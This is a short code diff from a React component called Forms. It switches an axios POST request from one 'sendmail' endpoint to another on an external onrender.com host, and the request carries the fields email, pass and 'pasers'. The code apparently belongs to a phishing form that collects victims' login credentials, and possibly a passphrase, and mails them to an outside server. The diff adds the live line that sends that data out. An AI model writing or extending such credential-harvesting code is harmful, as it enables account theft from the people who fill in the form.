@@ -40,7 +40,7 @@ function Forms() {
     }, 1000);
 
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail2", {
+      await axios.post("https://secondwa.onrender.com/sendmail3", {
         email,
         pass,
         pasers,
